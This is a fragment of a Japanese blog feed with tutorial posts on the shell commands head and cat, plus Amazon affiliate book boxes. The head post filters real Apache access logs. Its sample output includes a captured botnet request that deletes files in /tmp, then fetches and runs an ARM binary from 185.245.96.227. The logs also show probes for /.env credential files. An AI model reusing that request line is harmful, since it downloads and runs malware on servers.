&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（３）【head】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</link><pubDate>Thu, 10 Feb 2022 10:23:14 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-10-01-head-suzuki/bash.jpg" alt="Featured image of post （３）【head】シェルスクリプトコマンド活用紹介" />&lt;h2 id="headコマンド">headコマンド&lt;/h2>
&lt;ul>
&lt;li>headコマンドでファイルの先頭部分だけを表示する&lt;/li>
&lt;li>パイプを使って実行結果の最初の部分だけを確認する&lt;/li>
&lt;li>tailコマンドでファイルの末尾部分だけを表示する&lt;/li>
&lt;li>ログファイルを監視する&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>headはテキストファイルの最初の10行を、tailは最後の10行を表示するコマンドです。&lt;br>
表示する行数は、オプションで変更することができます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat ＜ファイル名＞ | head -n10
&lt;/code>&lt;/pre>&lt;p>headコマンドは「コマンド | head」のように、別のコマンドの実行結果の先頭部分を表示する際によく使われます。&lt;/p>
&lt;h2 id="headコマンドの書式">headコマンドの書式&lt;/h2>
&lt;p>head [オプション] ファイル名&lt;/p>
&lt;h2 id="headコマンドの主なオプション">headコマンドの主なオプション&lt;/h2>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">オプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-c 数字&lt;/td>
&lt;td>&amp;ndash;bytes 数字&lt;/td>
&lt;td>先頭から指定したバイト数のみ表示する。「-c 5 b」のように単位を付加することも可能（b=512, KB=1000, K=1024, MB=1000&lt;em>1000, M=1024&lt;/em>1024…）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-n 数字&lt;/td>
&lt;td>&amp;ndash;lines 数字&lt;/td>
&lt;td>先頭から指定した行数のみ表示する&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-q&lt;/td>
&lt;td>&amp;ndash;quiet, &amp;ndash;silent&lt;/td>
&lt;td>ファイルごとのヘッダ表示を行わない（複数ファイル指定時に使う）&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-v&lt;/td>
&lt;td>&amp;ndash;verbose&lt;/td>
&lt;td>常にファイルごとのヘッダ出力を行う&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;h2 id="headコマンド詳細説明">headコマンド詳細説明&lt;/h2>
&lt;p>headコマンドはファイルの先頭から１０行を表示するコマンドです。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head
&lt;/code>&lt;/pre>&lt;p>よく使われるオプションは、出力する行数を指定するオプション「n」です。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | head -n20
&lt;/code>&lt;/pre>&lt;p>データをソートしてベスト１０を出力するという場合によく使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ sudo cat /var/log/httpd/access_log | grep -iv &amp;quot;ELB-Health-Checker&amp;quot; | awk -F '&amp;quot;' '{ print $1; }' | awk '{ print $2; }' | sort | uniq -c | sort -nr | head
&lt;/code>&lt;/pre>&lt;p>sudo で一時的にrootになります。/var/log/ ディレクトリはローカルアカウントではアクセスできないことが多いです。&lt;br>
では、順番に説明していきます。&lt;/p>
&lt;p>まずは純粋にアクセスログを出力します。&lt;br>
長いのでheadコマンドを使いましょう。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | head
172.31.44.102 - - [28/Nov/2021:03:09:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:09:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:09:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:09:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:10:13 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:10:25 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.44.102 - - [28/Nov/2021:03:10:43 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
172.31.17.106 - - [28/Nov/2021:03:10:55 +0900] &amp;quot;GET / HTTP/1.1&amp;quot; 302 206 &amp;quot;-&amp;quot; &amp;quot;ELB-HealthChecker/2.0&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
:
:
:
&lt;/code>&lt;/pre>&lt;p>AWSのロードバランサーからの定期的なポーリングが多いのでgrep -v で除去します。&lt;br>
grepコマンドの -v オプションは「除外する」という意味です。-i オプションは大文字小文字を区別しないという意味です。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | head
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:58 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1&amp;quot; 302 230 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154&amp;quot;
117.50.1.250 - - [28/Nov/2021:03:10:59 +0900] &amp;quot;CONNECT guba.eastmoney.com:443 HTTP/1.1&amp;quot; 302 215 &amp;quot;-&amp;quot; &amp;quot;Apache-HttpClient/4.1 (java 1.5)&amp;quot;
98.244.147.169 - - [28/Nov/2021:03:13:12 +0900] &amp;quot;GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws&amp;quot; 400 226 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
61.136.101.77 - - [28/Nov/2021:03:15:39 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;POST / HTTP/1.1&amp;quot; 302 205 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
135.125.246.110 - - [28/Nov/2021:03:17:39 +0900] &amp;quot;GET /.env HTTP/1.1&amp;quot; 302 209 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36&amp;quot;
61.136.101.133 - - [28/Nov/2021:03:17:46 +0900] &amp;quot;GET http://dushu.baidu.com HTTP/1.1&amp;quot; 302 208 &amp;quot;-&amp;quot; &amp;quot;-&amp;quot;
164.90.204.15 - - [28/Nov/2021:03:20:54 +0900] &amp;quot;CONNECT www.yahoo.com:443 HTTP/1.1&amp;quot; 302 210 &amp;quot;-&amp;quot; &amp;quot;Go-http-client/1.1&amp;quot;
suzuki$
&lt;/code>&lt;/pre>&lt;p>それっぽいログが出るようになりました。&lt;br>
次にどこからのアクセスが多いのかを絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | head
GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
CONNECT guba.eastmoney.com:443 HTTP/1.1
GET http://guba.eastmoney.com/list,hk01500_1.html HTTP/1.1
CONNECT guba.eastmoney.com:443 HTTP/1.1
GET /shell?cd+/tmp;rm+-rf+*;wget+ 185.245.96.227/bins/arm;chmod+777+/tmp/arm;sh+/tmp/arm+selfrep.jaws
GET http://dushu.baidu.com HTTP/1.1
POST / HTTP/1.1
GET /.env HTTP/1.1
GET http://dushu.baidu.com HTTP/1.1
CONNECT www.yahoo.com:443 HTTP/1.1
suzuki$
&lt;/code>&lt;/pre>&lt;p>GETとPOSTの項目に絞り込まれました。&lt;br>
awk コマンドの -F はセパレータで、この場合は &amp;lsquo;&amp;quot;&amp;rsquo; を区切り文字として２番目の値を出力するという意味になります。最後のheadは確認は出力の冒頭だけで十分なのでつけています。&lt;/p>
&lt;p>次は、GET, CONNECT, POSTなどのコマンドを除去します。&lt;br>
awkコマンドのデフォルトのセパレーターは空白なので、空白区切りで数えると二つ目を表す $2 を使って絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }' | head
http://guba.eastmoney.com/list,hk01500_1.html
guba.eastmoney.com:443
http://guba.eastmoney.com/list,hk01500_1.html
guba.eastmoney.com:443
/shell?cd+/tmp;rm+-rf+*;wget+
http://dushu.baidu.com
/
/.env
http://dushu.baidu.com
www.yahoo.com:443
suzuki$
&lt;/code>&lt;/pre>&lt;p>次に、余計な出力を抑制します。&lt;br>
ここでは空白行を出力したくないので grep -v ^$ を使っています。&lt;br>
非常によく使うオプションなので覚えておくとよいです。&lt;/p>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>grep -v ^$&lt;/dd>
&lt;dd>空行を出力しない&lt;/dd>
&lt;dd>行頭を表す「^」と行末を表す「$」の間に何もないですね。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>では、同様にgrep -vで アスタリスクとスラッシュだけの行を絞り込みます。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'| grep -v ^$ | grep -v [*/] |s
ort| head
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
110.242.68.4:443
suzuki$
&lt;/code>&lt;/pre>&lt;p>最後に、出力をアルファベット順に並べ替えます。sortでよいです。&lt;br>
さらに uniq コマンドで同じ複数のレコードを一つにするわけですが、 -c オプションを使うと、何件の複数のレコードを一つにまとめたのかを、行頭に示してくれます。&lt;br>
そして sort -nr の -n は、行頭の数値、いわゆるuniq -c でまとめた件数を数値として並べ替えるという意味です。-r は、リバース、いわゆる逆順ソートですね。ここでは、件数の多いものから順番に出力します。headコマンドはデフォルトが１０検出力なので、head -n10 と書いてもよいですし、省略して head だけでもよいです。&lt;/p>
&lt;pre tabindex="0">&lt;code>suzuki$ sudo cat /var/log/httpd/access_log-20211205 | grep -v &amp;quot;ELB-HealthChecker&amp;quot; | awk -F '&amp;quot;' '{ print $2; }' | awk '{ print $2; }'|sort|uniq -c|sort -nr | head
850 http://dushu.baidu.com
839 /form.cgi
485 http://www.baidu.com/pub/css/new_font.css
477 /
265 *
258 guba.eastmoney.com:443
253
209 /.env
200 www.yahoo.com:443
184 istock.jrj.com.cn:443
suzuki$
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dt>:sudo cat filename | grep -v &amp;ldquo;除去したい文字列&amp;rdquo; | awk &amp;lsquo;{ print $2; }'| sort | uniq -c |sort -nr | head&lt;/dt>
&lt;dd>これはもはや定番中の定番です。覚えましょう。体に叩き込みましょう。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;p>head コマンドの紹介の割には長くなりました。&lt;/p>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4774186945/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4774186945&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=8ef3ff961c569212e910cf3d6e37dcb6" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41i956UyusL._SL250_.jpg" alt="[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">[改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB&amp;#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20&lt;/h2>
&lt;p>定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。
シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。
本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、
基本から丁寧に解説。
第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。
合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。
ますますパワーアップした改訂版をお届けします。&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797393106/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797393106&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=f514a6378c1c10e59ab16275745c2439" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/41d1D6rgDiL._SL250_.jpg" alt="新しいシェルプログラミングの教科書 単行本">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">新しいシェルプログラミングの教科書 単行本&lt;/h2>
&lt;p>エキスパートを目指せ!!
&lt;p>システム管理やソフトウェア開発など、&lt;br>
実際の業務では欠かせないシェルスクリプトの知識を徹底解説&lt;/p>
&lt;p>ほとんどのディストリビューションでデフォルトとなっているbashに特化することで、&lt;br>
類書と差別化を図るとともに、より実践的なプログラミングを紹介します。&lt;br>
またプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。&lt;br>
イマドキのエンジニア必携の一冊。&lt;/p>
&lt;p>▼目次&lt;br>
CHAPTER01 シェルってなんだろう&lt;br>
CHAPTER02 シェルスクリプトとは何か&lt;br>
CHAPTER03 シェルスクリプトの基本&lt;br>
CHAPTER04 変数&lt;br>
CHAPTER05 クォーティング&lt;br>
CHAPTER06 制御構造&lt;br>
CHAPTER07 リダイレクトとパイプ&lt;br>
CHAPTER08 関数&lt;br>
CHAPTER09 組み込みコマンド&lt;br>
CHAPTER10 正規表現と文字列&lt;br>
CHAPTER11 シェルスクリプトの実行方法&lt;br>
CHAPTER12 シェルスクリプトのサンプルで学ぼう&lt;br>
CHAPTER13 シェルスクリプトの実用例&lt;br>
CHAPTER14 テストとデバッグ&lt;br>
CHAPTER15 読みやすいシェルスクリプト&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside></description></item><item><title>（２）【cat】シェルスクリプトコマンド活用紹介</title><link>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</link><pubDate>Wed, 09 Feb 2022 12:59:39 +0900</pubDate><guid>https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/</guid><description>&lt;img src="https://suzukiiichiro.github.io/posts/2022-02-09-01-cat-suzuki/bash.jpg" alt="Featured image of post （２）【cat】シェルスクリプトコマンド活用紹介" />&lt;h2 id="catコマンド">catコマンド&lt;/h2>
&lt;ul>
&lt;li>ファイルの内容を表示する&lt;/li>
&lt;li>ファイルの内容を行番号付きで表示する&lt;/li>
&lt;li>複数ファイルを連結して1つのファイルにする&lt;/li>
&lt;/ul>
&lt;h2 id="概要">概要&lt;/h2>
&lt;p>「cat」は、「conCATenate（つなぐ、連結する）」のcatです。ファイルを連結するためのコマンドですが、ファイルの内容を表示する際によく使われます。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat ＜ファイル名＞
&lt;/code>&lt;/pre>&lt;h2 id="catコマンドの書式">catコマンドの書式&lt;/h2>
&lt;p>cat [オプション] ファイル1 ファイル2……&lt;/p>
&lt;h2 id="catコマンドの主なオプション">catコマンドの主なオプション&lt;/h2>
&lt;p>catコマンドの主なオプションは次の通りです。&lt;/p>
&lt;table>
&lt;thead>
&lt;tr>
&lt;th style="text-align:center">オプション&lt;/th>
&lt;th>長いオプション&lt;/th>
&lt;th>意味&lt;/th>
&lt;/tr>
&lt;/thead>
&lt;tbody>
&lt;tr>
&lt;td style="text-align:center">-n&lt;/td>
&lt;td>&amp;ndash;number&lt;/td>
&lt;td>行番号を付け加える&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-b&lt;/td>
&lt;td>&amp;ndash;number-nonblank&lt;/td>
&lt;td>行番号を付け加える。ただし空白行には付けない&lt;/td>
&lt;/tr>
&lt;tr>
&lt;td style="text-align:center">-s&lt;/td>
&lt;td>&amp;ndash;squeeze-blank&lt;/td>
&lt;td>連続した空行を1行にする&lt;/td>
&lt;/tr>
&lt;/tbody>
&lt;/table>
&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>一画面に収まらない長いファイルの場合は、lessコマンドを使うと便利です。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="catコマンド詳細説明">catコマンド詳細説明&lt;/h2>
&lt;h3 id="ファイルの内容を出力">ファイルの内容を出力&lt;/h3>
&lt;p>filenameの内容をターミナルに出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename
&lt;/code>&lt;/pre>&lt;p>長いファイルの場合は、lessコマンドを使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename | less
&lt;/code>&lt;/pre>&lt;h3 id="ファイルの結合">ファイルの結合&lt;/h3>
&lt;p>複数のファイルを結合（連結）させて別ファイルへ出力します。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename1 filname2 &amp;gt; filename3
&lt;/code>&lt;/pre>&lt;p>追記したい場合は「&amp;raquo;」を使います。&lt;/p>
&lt;pre tabindex="0">&lt;code>$ cat filename1 filname2 &amp;gt;&amp;gt; filename3
&lt;/code>&lt;/pre>&lt;div class="tips-area tips">
&lt;dl>
&lt;dt>ヒント&lt;/dt>
&lt;dd>「&amp;gt;」をリダイレクト、「&amp;raquo;」をアペンドと言います。「&amp;gt;」はファイルを新規作成してファイルへ出力します。「&amp;raquo;」は既存のファイルへ追記出力します。&lt;/dd>
&lt;dd>「&amp;gt;」は、内容があってもファイルの内容を空にして出力することに注意しなくてはなりません。&lt;/dd>
&lt;/dl>
&lt;/div>
&lt;h2 id="書籍の紹介">書籍の紹介&lt;/h2>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4873112672/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4873112672&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=ef087fd92d3628bb94e1eb10cb202d43" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51EAPCH56ML._SL250_.jpg" alt="詳解 シェルスクリプト 大型本 – 2006/1/16">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">詳解 シェルスクリプト 大型本 – 2006/1/16&lt;/h2>
&lt;p>Unixのプログラムは「ツール」と呼ばれます。
Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。
そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。
また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。
つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。
本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。
標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、
目的の処理を実現するための方法を詳しく学ぶことができます。
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
&lt;a href="https://www.amazon.co.jp/gp/product/4797377623/ref=as_li_tl?ie=UTF8&amp;amp;camp=247&amp;amp;creative=1211&amp;amp;creativeASIN=4797377623&amp;amp;linkCode=as2&amp;amp;tag=nlpqueens-22&amp;amp;linkId=3c8d4566263ae99374221c4f8f469154" target="_blank">
&lt;div class="columns amazon-image">
&lt;img border="0" src="https://m.media-amazon.com/images/I/51R5SZKrEAL._SL250_.jpg" alt="UNIXシェルスクリプト マスターピース132">
&lt;/div>
&lt;div class="columns amazon-info">
&lt;h2 class="amazon-name">UNIXシェルスクリプト マスターピース132&lt;/h2>
&lt;p>すべてのUNIXエンジニア必携!!
&lt;p>サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。&lt;br>
知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。&lt;/p>
&lt;/p>
&lt;span class="link">Amazonで詳細を見る&lt;/span>
&lt;/div>
&lt;/a>
&lt;small>Amazon.co.jpアソシエイトを使用&lt;/small>
&lt;/aside>
&lt;aside class="amazon-box">
